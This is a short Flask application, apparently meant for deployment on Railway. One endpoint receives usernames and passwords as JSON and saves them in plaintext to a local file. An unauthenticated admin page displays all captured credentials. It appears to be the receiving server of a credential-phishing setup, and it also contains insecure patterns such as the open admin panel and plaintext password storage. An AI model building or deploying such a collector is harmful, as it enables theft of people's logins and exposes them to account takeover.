from flask import Flask, request, jsonify, render_template_string, redirect, url_for
import json
import os

app = Flask(__name__)

DATA_FILE = "logs.json"

def load_data():
    if not os.path.exists(DATA_FILE):
        return []
    with open(DATA_FILE, "r", encoding="utf-8") as f:
        return json.load(f)

def save_data(data):
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

@app.route("/submit", methods=["POST"])
def submit():
    try:
        info = request.get_json()
        user = info.get("user")
        password = info.get("password")

        if not user or not password:
            return "Missing fields", 400

        logs = load_data()
        logs.append({"user": user, "password": password})
        save_data(logs)

        return "OK", 200
    except Exception as e:
        return str(e), 500

@app.route("/admin", methods=["GET", "POST"])
def admin():
    logs = load_data()
    if request.method == "POST":
        index = int(request.form.get("delete"))
        if 0 <= index < len(logs):
            del logs[index]
            save_data(logs)
            return redirect(url_for("admin"))

    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Admin Panel</title>
        <style>
            body { font-family: Arial; background: #111; color: #eee; padding: 20px; }
            table { border-collapse: collapse; width: 100%; }
            th, td { border: 1px solid #444; padding: 8px; text-align: left; }
            th { background: #222; }
            tr:nth-child(even) { background: #1c1c1c; }
            form { margin: 0; }
            button { background: #e74c3c; color: white; border: none; padding: 5px 10px; cursor: pointer; }
            button:hover { background: #c0392b; }
        </style>
    </head>
    <body>
        <h2>Admin Log Viewer</h2>
        <table>
            <tr><th>#</th><th>Username</th><th>Password</th><th>Action</th></tr>
            {% for i, item in enumerate(logs) %}
            <tr>
                <td>{{ i }}</td>
                <td>{{ item.user }}</td>
                <td>{{ item.password }}</td>
                <td>
                    <form method="post">
                        <input type="hidden" name="delete" value="{{ i }}">
                        <button type="submit">Xoá</button>
                    </form>
                </td>
            </tr>
            {% endfor %}
        </table>
    </body>
    </html>
    """
    return render_template_string(html, logs=logs)


# ✅ Dòng QUAN TRỌNG để Railway chạy được
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))  # 👈 Railway tự set biến PORT cho đúng
    print(f"🚀 Starting app on port {port}")
    app.run(host="0.0.0.0", port=port)
# ✅ Railway sẽ tự động chạy file này khi deploy
